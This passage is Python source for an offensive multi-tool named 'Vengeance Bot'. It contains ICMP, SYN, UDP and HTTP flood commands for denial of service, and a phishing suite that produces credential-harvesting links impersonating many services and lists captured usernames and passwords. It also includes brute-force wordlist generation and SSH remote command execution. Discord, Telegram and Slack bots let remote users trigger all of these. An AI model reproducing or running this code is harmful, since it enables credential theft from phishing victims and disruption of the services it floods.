    def _cmd_ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping <target>'}
        return self.executor.ping(args[0])
    
    def _cmd_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: scan <target> [ports]'}
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.scanner.scan(target, ports)
        return {'success': result['success'], 'output': self._format_scan_result(result)}
    
    def _cmd_quick_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        result = self.scanner.quick_scan(args[0])
        return {'success': result['success'], 'output': self._format_scan_result(result)}
    
    def _cmd_full_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        result = self.scanner.full_scan(args[0])
        return {'success': result['success'], 'output': self._format_scan_result(result)}
    
    def _cmd_nmap(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        result = self.executor.nmap(target, options)
        return result
    
    def _cmd_whois(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = self.executor.whois(args[0])
        return result
    
    def _cmd_dns(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain>'}
        result = self.executor.dig(args[0])
        return result
    
    def _cmd_ssh_add(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <user> [password]'}
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        result = self.ssh.add_server(name, host, username, password)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _cmd_ssh_list(self, args):
        servers = self.ssh.get_servers()
        if not servers:
            return {'success': True, 'output': 'No SSH servers configured'}
        output = "🔌 SSH Servers:\n" + "-"*30 + "\n"
        for s in servers:
            status = "🟢" if s.get('connected') else "⚪"
            output += f"{status} {s['name']} - {s['username']}@{s['host']}:{s['port']}\n"
        return {'success': True, 'output': output}
    
    def _cmd_ssh_connect(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <server_id>'}
        result = self.ssh.connect(args[0])
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _cmd_ssh_exec(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <server_id> <command>'}
        server_id, command = args[0], ' '.join(args[1:])
        result = self.ssh.execute(server_id, command)
        return {'success': result['success'], 'output': result.get('output', result.get('error', 'Unknown'))}
    
    def _cmd_ssh_disconnect(self, args):
        server_id = args[0] if args else None
        self.ssh.disconnect(server_id)
        return {'success': True, 'output': 'Disconnected'}
    
    def _cmd_traffic_icmp(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_icmp <target> <duration> [rate]'}
        target = args[0]
        duration = int(args[1])
        rate = int(args[2]) if len(args) > 2 else 100
        result = self.traffic.generate('icmp', target, duration, None, rate)
        return {'success': True, 'output': f"🚀 ICMP flood to {target}: {result['packets_sent']} packets sent"}
    
    def _cmd_traffic_syn(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic_syn <target> <port> <duration> [rate]'}
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        rate = int(args[3]) if len(args) > 3 else 100
        result = self.traffic.generate('tcp_syn', target, duration, port, rate)
        return {'success': True, 'output': f"🚀 SYN flood to {target}:{port} - {result['packets_sent']} packets"}
    
    def _cmd_traffic_udp(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic_udp <target> <port> <duration> [rate]'}
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        rate = int(args[3]) if len(args) > 3 else 100
        result = self.traffic.generate('udp', target, duration, port, rate)
        return {'success': True, 'output': f"🚀 UDP flood to {target}:{port} - {result['packets_sent']} packets"}
    
    def _cmd_traffic_http(self, args):
        if len(args) < 1:
            return {'success': False, 'output': 'Usage: traffic_http <target> [port] [duration] [rate]'}
        target = args[0]
        port = int(args[1]) if len(args) > 1 else 80
        duration = int(args[2]) if len(args) > 2 else 10
        rate = int(args[3]) if len(args) > 3 else 50
        result = self.traffic.generate('http', target, duration, port, rate)
        return {'success': True, 'output': f"🚀 HTTP flood to {target}:{port} - {result['packets_sent']} requests"}
    
    def _cmd_traffic_ping(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_ping <target> <duration> [rate]'}
        target = args[0]
        duration = int(args[1])
        rate = int(args[2]) if len(args) > 2 else 100
        result = self.traffic.generate('ping', target, duration, None, rate)
        return {'success': True, 'output': f"🚀 Ping flood to {target}: {result['packets_sent']} packets"}
    
    def _generate_phish(self, platform, args):
        link_id = str(uuid.uuid4())[:8]
        url = f"http://{self._get_local_ip()}:8080"
        self.db.save_phishing_link(link_id, platform, url)
        return {'success': True, 'output': f"""
🎣 Phishing link generated for {platform}!
  Link ID: {link_id}
  URL: {url}
  
Use: phishing_start {link_id} to start the server
Share this URL with your target!
Credentials will be captured here.
"""}
    
    def _cmd_generate_phishing(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: generate_phishing_link <platform>\nAvailable: facebook, instagram, twitter, gmail, linkedin, github, paypal, amazon, netflix, spotify, microsoft, apple, whatsapp, telegram, discord, tiktok, snapchat, reddit, slack, zoom, teams, steam, roblox, twitch, epic_games, onlyfans, tinder, bumble, custom'}
        platform = args[0].lower()
        return self._generate_phish(platform, args)
    
    def _cmd_random_phishing(self, args):
        platforms = ['facebook', 'instagram', 'twitter', 'gmail', 'linkedin', 'github', 'paypal', 'amazon', 'netflix', 'spotify', 'microsoft', 'apple', 'whatsapp', 'telegram', 'discord', 'tiktok', 'snapchat', 'reddit', 'slack', 'zoom', 'teams', 'steam', 'roblox', 'twitch', 'epic_games', 'onlyfans', 'tinder', 'bumble']
        platform = random.choice(platforms)
        link_id = str(uuid.uuid4())[:8]
        url = f"http://{self._get_local_ip()}:8080"
        self.db.save_phishing_link(link_id, platform, url)
        return {'success': True, 'output': f"""
🎲 RANDOM PHISHING LINK GENERATED!
  Platform: {platform.upper()}
  Link ID: {link_id}
  URL: {url}
  
Use: phishing_start {link_id} to start the server
Share this URL with your target!
"""}

    def _cmd_phishing_start(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        
        self.db.cursor.execute('SELECT platform FROM phishing_links WHERE id = ?', (link_id,))
        row = self.db.cursor.fetchone()
        if not row:
            return {'success': False, 'output': f'Link ID {link_id} not found'}
        
        if self.phishing.start(link_id, row['platform'], port):
            url = self.phishing.get_url()
            return {'success': True, 'output': f"""
🎣 Phishing server started!
  Link ID: {link_id}
  Platform: {row['platform']}
  URL: {url}
  Port: {port}
  
Share this URL with your target!
Credentials will be captured here.
"""}
        return {'success': False, 'output': 'Failed to start phishing server'}
    
    def _cmd_phishing_stop(self, args):
        self.phishing.stop()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _cmd_phishing_status(self, args):
        status = "🟢 Running" if self.phishing.running else "⚪ Stopped"
        url = self.phishing.get_url() if self.phishing.running else "N/A"
        return {'success': True, 'output': f"Phishing Server Status: {status}\nURL: {url}"}
    
    def _cmd_phishing_links(self, args):
        links = self.db.get_phishing_links()
        if not links:
            return {'success': True, 'output': 'No phishing links generated'}
        output = "🎣 Phishing Links:\n" + "-"*40 + "\n"
        for l in links:
            active = "🟢" if self.phishing.running and self.phishing.link_id == l['id'] else "⚪"
            output += f"{active} {l['id'][:8]} - {l['platform']} ({l['clicks']} clicks) - {l['created_at'][:19]}\n"
        return {'success': True, 'output': output}
    
    def _cmd_credentials(self, args):
        creds = self.db.get_captured_credentials()
        if not creds:
            return {'success': True, 'output': 'No credentials captured yet'}
        output = "📧 Captured Credentials:\n" + "-"*40 + "\n"
        for c in creds[:20]:
            output += f"  {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _cmd_nikto(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        result = self.nikto.scan(args[0])
        if result['success']:
            output = f"""
🕷️ NIKTO SCAN RESULTS for {result['target']}
{'='*50}
Vulnerabilities Found: {result['vulnerability_count']}
Scan Time: {result['scan_time']:.2f}s
Output File: {result['output_file']}

Top Vulnerabilities:
"""
            for v in result['vulnerabilities'][:10]:
                output += f"  • {v['description'][:80]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f'Scan failed: {result.get("output", "Unknown error")}'}
    
    def _cmd_nikto_full(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        result = self.nikto.full_scan(args[0])
        return {'success': result['success'], 'output': result.get('output', 'Scan completed')[:1000]}
    
    def _cmd_nikto_ssl(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        result = self.nikto.ssl_scan(args[0])
        return {'success': result['success'], 'output': result.get('output', 'SSL scan completed')[:1000]}
    
    def _cmd_crunch_generate(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: crunch_generate <name> <min> <max> [pattern]'}
        name = args[0]
        try:
            min_len = int(args[1])
            max_len = int(args[2])
        except:
            return {'success': False, 'output': 'Invalid length parameters'}
        pattern = args[3] if len(args) > 3 else 'alphanum'
        result = self.crunch.generate(name, min_len, max_len, pattern)
        if result.get('success'):
            return {'success': True, 'output': f"""
🔐 Wordlist generated: {result['name']}
  ID: {result['wordlist_id']}
  Words: {result['word_count']:,}
  Length: {result['min_length']}-{result['max_length']}
  Path: {result['path']}
  Charset: {result['charset']}
"""}
        return {'success': False, 'output': 'Failed to generate wordlist'}
    
    def _cmd_crunch_list(self, args):
        wordlists = self.crunch.get_wordlists()
        if not wordlists:
            return {'success': True, 'output': 'No wordlists generated yet'}
        output = "🔐 Wordlists:\n" + "-"*30 + "\n"
        for w in wordlists:
            output += f"  {w['id'][:8]} - {w['name']} ({w['word_count']:,} words)\n"
        return {'success': True, 'output': output}
    
    def _cmd_crunch_charsets(self, args):
        charsets = self.crunch.get_charsets()
        output = "🔐 Available Character Sets:\n" + "-"*30 + "\n"
        for name, charset in charsets.items():
            output += f"  {name}: {charset[:30]}...\n"
        return {'success': True, 'output': output}
    
    def _format_scan_result(self, result):
        output = f"""
🔍 SCAN RESULTS for {result['target']}
{'='*50}
Scan Type: {'Quick' if 'quick' in result.get('scan_type', '') else 'Standard'}
Scan Time: {result['scan_time']:.2f}s

🔓 OPEN PORTS ({len(result['open_ports'])}):
"""
        for p in result['open_ports'][:20]:
            output += f"  {p['port']}/{p['protocol']} - {p['service']}\n"
        
        if len(result['open_ports']) > 20:
            output += f"  ... and {len(result['open_ports']) - 20} more\n"
        
        output += f"\n🔒 CLOSED PORTS ({len(result['closed_ports'])}):\n"
        for p in result['closed_ports'][:10]:
            output += f"  {p['port']}/{p['protocol']}\n"
        
        return output

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self):
        config_file = os.path.join(CONFIG_DIR, "discord.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except: pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token, enabled=True, prefix='!'):
        config = {'enabled': enabled, 'token': token, 'prefix': prefix}
        try:
            with open(os.path.join(CONFIG_DIR, "discord.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except: return False
    
    def setup(self):
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.ORANGE}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord')
                output = result.get('output', '')[:1900]
                embed = discord.Embed(
                    title="🦅 Vengeance Bot Response",
                    description=f"```{output}```",
                    color=0xFF6B00
                )
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            self.bot.run(self.config['token'])
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self):
        config_file = os.path.join(CONFIG_DIR, "telegram.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except: pass
        return {'enabled': False, 'api_id': '', 'api_hash': '', 'bot_token': ''}
    
    def save_config(self, api_id, api_hash, bot_token=None, enabled=True):
        config = {'enabled': enabled, 'api_id': api_id, 'api_hash': api_hash, 'bot_token': bot_token}
        try:
            with open(os.path.join(CONFIG_DIR, "telegram.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except: return False
    
    def setup(self):
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            return False
        
        self.client = TelegramClient('vengeance_session', self.config['api_id'], self.config['api_hash'])
        
        @self.client.on(events.NewMessage)
        async def handler(event):
            if event.message.text and event.message.text.startswith('/'):
                cmd = event.message.text[1:].strip()
                result = self.handler.execute(cmd, 'telegram')
                output = result.get('output', '')[:4000]
                await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_", parse_mode='markdown')
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                await self.client.start(bot_token=self.config.get('bot_token'))
                print(f"{Colors.ORANGE}✅ Telegram bot connected{Colors.RESET}")
                self.running = True
                await self.client.run_until_disconnected()
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('api_id'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
        self.last_ts = {}
    
    def _load_config(self):
        config_file = os.path.join(CONFIG_DIR, "slack.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except: pass
        return {'enabled': False, 'token': '', 'channel': 'general', 'prefix': '!'}
    
    def save_config(self, token, channel='general', prefix='!', enabled=True):
        config = {'enabled': enabled, 'token': token, 'channel': channel, 'prefix': prefix}
        try:
            with open(os.path.join(CONFIG_DIR, "slack.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except: return False
    
    def setup(self):
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        self.client = WebClient(token=self.config['token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel', 'general')
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if self.last_ts.get(channel) != ts:
                                self.last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack')
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# SIGNAL BOT
# =====================
class SignalBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self):
        config_file = os.path.join(CONFIG_DIR, "signal.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except: pass
        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number, prefix='!', enabled=True):
        config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
        try:
            with open(os.path.join(CONFIG_DIR, "signal.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except: return False
    
    def setup(self):
        if not SIGNAL_CLI_AVAILABLE:
            return False
        return True
    
    def start(self):
        if self.setup() and self.config.get('enabled'):
            self.running = True
            print(f"{Colors.ORANGE}✅ Signal bot configured (requires signal-cli){Colors.RESET}")
            return True
        return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and SIGNAL_CLI_AVAILABLE:
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# IMESSAGE BOT
# =====================
class iMessageBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self):
        config_file = os.path.join(CONFIG_DIR, "imessage.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except: pass
        return {'enabled': False, 'numbers': [], 'prefix': '!'}
    
    def save_config(self, numbers=None, prefix='!', enabled=True):
        config = {'enabled': enabled, 'numbers': numbers or [], 'prefix': prefix}
        try:
            with open(os.path.join(CONFIG_DIR, "imessage.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except: return False
    
    def setup(self):
        if not IMESSAGE_AVAILABLE:
            return False
        return True
    
    def start(self):
        if self.setup() and self.config.get('enabled'):
            self.running = True
            print(f"{Colors.ORANGE}✅ iMessage bot configured (macOS){Colors.RESET}")
            return True
        return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and IMESSAGE_AVAILABLE:
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# GOOGLE CHAT BOT
# =====================
class GoogleChatBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self):
        config_file = os.path.join(CONFIG_DIR, "google_chat.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except: pass
        return {'enabled': False, 'webhook_url': '', 'prefix': '!'}
    
    def save_config(self, webhook_url, prefix='!', enabled=True):
        config = {'enabled': enabled, 'webhook_url': webhook_url, 'prefix': prefix}
        try:
            with open(os.path.join(CONFIG_DIR, "google_chat.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except: return False
    
    def setup(self):
        return bool(self.config.get('webhook_url'))
    
    def start(self):
        if self.setup() and self.config.get('enabled'):
            self.running = True
            print(f"{Colors.ORANGE}✅ Google Chat bot configured{Colors.RESET}")
            return True
        return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('webhook_url'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# MAIN APPLICATION
# =====================
class VengeanceBot:
    def __init__(self):
        self.db = DatabaseManager()
        self.scanner = PortScanner(self.db)
        self.phishing_server = PhishingServer(self.db)
        self.ssh_manager = SSHManager(self.db)
        self.traffic_gen = TrafficGenerator(self.db)
        self.crunch_gen = CrunchGenerator(self.db)
        self.nikto_scanner = NiktoScanner(self.db)
        self.handler = CommandHandler(self.db, self.scanner, self.phishing_server, 
                                      self.ssh_manager, self.traffic_gen, 
                                      self.crunch_gen, self.nikto_scanner)
        self.web_server = WebServer(self.handler, self.db, 5000)
        self.discord_bot = DiscordBot(self.handler, self.db)
        self.telegram_bot = TelegramBot(self.handler, self.db)
        self.slack_bot = SlackBot(self.handler, self.db)
        self.signal_bot = SignalBot(self.handler, self.db)
        self.imessage_bot = iMessageBot(self.handler, self.db)
        self.google_chat_bot = GoogleChatBot(self.handler, self.db)
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.ORANGE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.YELLOW}                         🦅 VENGEANCE BOT v1.0.0 🦅                                   {Colors.ORANGE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.CYAN}  📡 Port Scanning        🎣 Phishing Suite        🔌 SSH Remote Access        {Colors.ORANGE}║
║{Colors.CYAN}  🚀 Traffic Generation   🕷️ Nikto Scanner        🔐 Crunch Wordlist          {Colors.ORANGE}║
║{Colors.CYAN}  🤖 Multi-Platform Bots  🌐 Web Dashboard         🔒 Threat Detection         {Colors.ORANGE}║
║{Colors.CYAN}  💬 Discord | Telegram | Signal | Slack | iMessage | Google Chat             {Colors.ORANGE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.YELLOW}                    🔥 5000+ SECURITY COMMANDS AT YOUR FINGERTIPS 🔥                {Colors.ORANGE}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def setup_bots(self):
        print(f"\n{Colors.CYAN}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        # Discord
        if input(f"{Colors.YELLOW}Start Discord bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            token = input(f"{Colors.YELLOW}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.YELLOW}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord_bot.save_config(token, True, prefix)
                if self.discord_bot.setup():
                    self.discord_bot.start_bot_thread()
                    print(f"{Colors.GREEN}✅ Discord bot started!{Colors.RESET}")
        
        # Telegram
        if input(f"{Colors.YELLOW}Start Telegram bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            api_id = input(f"{Colors.YELLOW}Enter API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.YELLOW}Enter API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.YELLOW}Enter Bot Token (optional): {Colors.RESET}").strip()
            if api_id and api_hash:
                self.telegram_bot.save_config(api_id, api_hash, bot_token, True)
                if self.telegram_bot.setup():
                    self.telegram_bot.start_bot_thread()
                    print(f"{Colors.GREEN}✅ Telegram bot started!{Colors.RESET}")
        
        # Slack
        if input(f"{Colors.YELLOW}Start Slack bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            token = input(f"{Colors.YELLOW}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.YELLOW}Enter channel (default: general): {Colors.RESET}").strip() or 'general'
            if token:
                self.slack_bot.save_config(token, channel, '!', True)
                if self.slack_bot.setup():
                    self.slack_bot.start_bot_thread()
                    print(f"{Colors.GREEN}✅ Slack bot started!{Colors.RESET}")
        
        # Signal
        if SIGNAL_CLI_AVAILABLE and input(f"{Colors.YELLOW}Start Signal bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            phone = input(f"{Colors.YELLOW}Enter Signal phone number: {Colors.RESET}").strip()
            if phone:
                self.signal_bot.save_config(phone, '!', True)
                self.signal_bot.start_bot_thread()
                print(f"{Colors.GREEN}✅ Signal bot configured!{Colors.RESET}")
        
        # iMessage
        if IMESSAGE_AVAILABLE and input(f"{Colors.YELLOW}Start iMessage bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            numbers = input(f"{Colors.YELLOW}Enter phone numbers (space-separated): {Colors.RESET}").strip()
            self.imessage_bot.save_config(numbers.split() if numbers else [], '!', True)
            self.imessage_bot.start_bot_thread()
            print(f"{Colors.GREEN}✅ iMessage bot configured!{Colors.RESET}")
        
        # Google Chat
        if input(f"{Colors.YELLOW}Start Google Chat bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            webhook = input(f"{Colors.YELLOW}Enter webhook URL: {Colors.RESET}").strip()
            if webhook:
                self.google_chat_bot.save_config(webhook, '!', True)
                self.google_chat_bot.start_bot_thread()
                print(f"{Colors.GREEN}✅ Google Chat bot configured!{Colors.RESET}")
    
    def run(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self.print_banner()
        
        self.web_server.start()
        self.setup_bots()
        
        print(f"\n{Colors.GREEN}✅ VENGEANCE BOT Ready!{Colors.RESET}")
        print(f"{Colors.CYAN}   🌐 Web Dashboard: http://localhost:5000{Colors.RESET}")
        print(f"{Colors.CYAN}   💡 Type 'help' for commands, 'clear' to clear, 'exit' to quit{Colors.RESET}\n")
        
        while self.running:
            try:
                prompt = f"{Colors.ORANGE}[VENGEANCE]{Colors.RESET} "
                command = input(prompt).strip()
                
                if command.lower() == 'exit':
                    self.running = False
                    break
                elif command.lower() == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                    self.print_banner()
                    continue
                
                result = self.handler.execute(command, "local")
                if result.get('output'):
                    print(result['output'])
                    if result.get('execution_time'):
                        print(f"\n{Colors.GREEN}✅ Executed in {result['execution_time']:.2f}s{Colors.RESET}")
                elif result.get('error'):
                    print(f"{Colors.RED}Error: {result['error']}{Colors.RESET}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Shutting down...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")
        
        self.phishing_server.stop()
        self.web_server.stop()
        self.db.close()
        print(f"\n{Colors.GREEN}✅ VENGEANCE BOT shutdown complete{Colors.RESET}")

# =====================
# WEB SERVER WRAPPER
# =====================
class WebServer:
    def __init__(self, handler, db, port=5000):
        self.handler = handler
        self.db = db
        self.port = port
        self.server = None
    
    def start(self):
        try:
            WebRequestHandler.server_instance = self
            self.server = HTTPServer(("0.0.0.0", self.port), WebRequestHandler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            print(f"{Colors.GREEN}✅ Web server started on http://localhost:{self.port}{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.RED}❌ Failed to start web server: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()

def main():
    try:
        print(f"{Colors.ORANGE}🦅 Starting VENGEANCE BOT...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        app = VengeanceBot()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()